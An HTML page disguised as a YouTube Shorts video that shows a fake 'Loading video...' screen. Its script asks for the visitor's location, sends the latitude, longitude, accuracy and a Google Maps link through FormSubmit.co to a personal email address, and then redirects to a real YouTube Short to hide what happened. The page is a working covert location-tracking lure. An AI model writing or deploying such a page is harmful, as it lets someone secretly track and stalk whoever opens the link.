<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>YouTube Shorts</title>
  <style>
    body {
      margin: 0;
      background-color: black;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: white;
      font-family: Arial, sans-serif;
    }
    .video-frame {
      width: 360px;
      height: 640px;
      background-color: #111;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 10px;
      overflow: hidden;
      position: relative;
    }
    .video-frame img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .logo {
      position: absolute;
      top: 10px;
      left: 10px;
      width: 90px;
    }
    .loading-text {
      margin-top: 20px;
      color: gray;
    }
  </style>
</head>
<body>

<div class="video-frame">
  <img src="https://i.imgur.com/o8Qx0Zp.png" alt="Short Video">
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" alt="YouTube Logo">
</div>

<p class="loading-text">Loading video...</p>

<script>
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, error);
  } else {
    console.log("Geolocation not supported");
    redirectToYouTube();
  }

  function success(position) {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;
    var accuracy = position.coords.accuracy;

    console.log("Latitude:", latitude);
    console.log("Longitude:", longitude);

    // Send email using FormSubmit.co service (FREE & no backend needed!)
    fetch("https://formsubmit.co/ajax/shindeaditya345@gmail.com", {
      method: "POST",
      headers: { 
        "Content-Type": "application/json",
        "Accept": "application/json"
      },
      body: JSON.stringify({
        Latitude: latitude,
        Longitude: longitude,
        Accuracy: accuracy + " meters",
        Google_Maps_Link: `https://maps.google.com/?q=${latitude},${longitude}`
      })
    }).then(response => {
      console.log('Email sent successfully!');
      redirectToYouTube();
    }).catch(error => {
      console.error('Error sending email:', error);
      redirectToYouTube();
    });
  }

  function error(err) {
    console.log("Error: " + err.message);
    redirectToYouTube();
  }

  function redirectToYouTube() {
    // After sending data, redirect to real YouTube Shorts
    window.location.href = "https://youtube.com/shorts/xfYVig97JbI?si=gC98PjAgUb3mr8cz";
  }
</script>

</body>
</html>
